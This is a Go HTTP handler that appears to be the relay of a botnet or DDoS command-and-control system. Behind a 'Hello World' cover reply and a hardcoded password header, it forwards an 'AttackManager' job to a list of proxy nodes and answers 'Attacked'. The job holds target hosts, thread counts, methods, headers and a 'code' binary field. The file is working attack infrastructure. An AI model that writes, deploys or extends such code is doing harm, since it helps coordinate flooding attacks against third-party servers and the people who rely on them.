package handler

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"sync"

	"github.com/labstack/echo"
	"github.com/labstack/echo/middleware"
)

type Proxy struct {
	Proxy   []string `json:"proxy"`
	Manager AttackManager
}

type Attack struct {
	Host   string `json:"host"`
	Thread int    `json:"thread"`
	Method string `json:"method"`
	Hash   string `json:"hash"`

	Headers []string `json:"headers"`
	B       Binary
}

type Binary struct {
	Code string `json:"code"`
}

type AttackManager struct {
	Managers map[string]*Attack
}

func proxy(c echo.Context) error {
	body, err := io.ReadAll(c.Request().Body)
	if err != nil {
		fmt.Println(err)
		return c.String(http.StatusOK, "Hello World")
	}
	password := c.Request().Header.Get("X-Password")
	if password != "ipRPBRzxxDjprV-RPSdBfKhM5B5-SLLQsCh5rBCYXTZMTaZtH8Ee6zu2YCAVzYQpmWtdQTiHWksNjBKepM3Jn2jRNAcisVykYKBf" {
		return c.String(http.StatusOK, "Hello World")
	}
	var p Proxy
	err = json.Unmarshal(body, &p)
	if err != nil {
		fmt.Println(err)
		return c.String(http.StatusOK, "Hello World")
	}
	var wg sync.WaitGroup
	for _, value := range p.Proxy {
		URL := value
		wg.Add(1)
		go func() {
			defer wg.Done()
			if len(p.Manager.Managers) != 0 {
				NewJSON, err := json.Marshal(p.Manager)
				if err != nil {
					fmt.Println(err)
					return
				}
				data := bytes.NewBuffer(NewJSON)
				req, err := http.NewRequest("GET", URL, data)
				if err != nil {
					fmt.Println(err)
					return
				}
				req.Header.Set("X-Password", "ipRPBRzxxDjprV-RPSdBfKhM5B5-SLLQsCh5rBCYXTZMTaZtH8Ee6zu2YCAVzYQpmWtdQTiHWksNjBKepM3Jn2jRNAcisVykYKBf")
				client := http.Client{}
				client.Do(req)
			}
		}()
	}
	wg.Wait()
	return c.String(http.StatusOK, "Attacked")
}

func Handler(w http.ResponseWriter, r *http.Request) {
	//go Rule()
	e := echo.New()
	e.Use(middleware.Logger())
	e.Use(middleware.Recover())
	e.GET("/api/hello", proxy)

	e.ServeHTTP(w, r)
}
